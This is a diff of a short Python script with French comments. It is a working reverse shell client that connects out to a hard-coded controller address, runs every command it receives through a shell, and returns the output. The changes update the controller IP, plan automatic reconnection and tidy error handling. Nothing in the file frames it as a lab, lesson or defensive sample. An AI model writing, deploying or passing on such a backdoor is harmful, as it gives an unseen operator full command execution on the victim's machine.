@@ -5,11 +5,14 @@
 # Start of project : 25/11/2020
 # Actual version : 1.1
 
+# Futures features :
+# Ajouter la reconnexion automatique (toutes les secondes tenté une reconnexion avec une fonction)
+
 import socket
 import subprocess
 import os
 
-host, port = ('192.168.1.100', 1235)
+host, port = ('192.168.43.90', 1235)
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try :
@@ -24,7 +27,6 @@ try :
         command = socket.recv(9999)
         command = command.decode("utf8")
 
-        print(command[3:])
 
         if command[:2] == "cd":
             try :
@@ -34,15 +36,20 @@ try :
                 result = os.getcwd()
                 socket.send(result.encode())
             except:
-                result = "Chemin invalide !"
+                result = "Le chemin invalide ou vous n'avez pas les permissions !"
                 socket.send(result.encode())
         else:
 
-            print(command)
+            print("> " + command)
 
             result = subprocess.check_output(command, shell=True)
-            print(result.decode("utf-8"))
-            socket.send(result)
+            # Parfois la commande ne retourne rien et donc génère une erreur d'où l'utilité de ce if
+            if result.decode("utf-8", errors="ignore") == "":
+                result = " "
+                socket.send(result.encode())
+            else:
+                #print(result.decode("utf-8", errors="ignore"))
+                socket.send(result)
 
 except:
     print(' /!\ Connexion au serveur échouée /!\ ')
